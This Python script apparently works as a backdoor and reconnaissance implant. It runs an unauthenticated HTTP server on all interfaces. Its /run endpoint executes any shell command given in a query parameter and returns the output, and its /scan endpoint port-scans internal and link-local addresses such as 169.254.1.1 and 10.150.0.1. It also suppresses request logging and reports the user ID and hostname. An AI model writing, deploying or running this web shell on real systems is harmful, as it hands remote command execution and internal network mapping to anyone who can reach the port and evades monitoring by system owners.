import http.server, socketserver, os, json, subprocess, urllib.parse, socket
def scan(hosts, ports):
    out = {}
    for h in hosts:
        opens = []
        for p in ports:
            try:
                s = socket.socket(); s.settimeout(0.5); s.connect((h, p)); opens.append(p); s.close()
            except Exception: pass
        out[h] = opens
    return out
def run(c):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, timeout=60)
        return {"rc": r.returncode, "out": r.stdout.decode('utf-8','replace')[:15000], "err": r.stderr.decode('utf-8','replace')[:2000]}
    except Exception as e: return {"error": str(e)[:200]}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/scan":
            hosts = q.get("h", ["169.254.1.2,10.150.0.1,169.254.1.1,127.0.0.1"])[0].split(",")
            ports = [int(x) for x in q.get("p", [",".join(str(i) for i in range(1,1025))])[0].split(",") if x]
            body = json.dumps(scan(hosts, ports)).encode()
        elif u.path == "/run" and "c" in q:
            body = json.dumps(run(q["c"][0])).encode()
        elif u.path == "/build":
            try: body = open("/app/v17.txt","rb").read()
            except Exception as e: body = json.dumps({"err":str(e)}).encode()
        else:
            body = json.dumps({"uid": os.getuid(), "host": socket.gethostname(), "ok": True}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0", int(os.environ.get("PORT",3000))), H) as s: s.serve_forever()
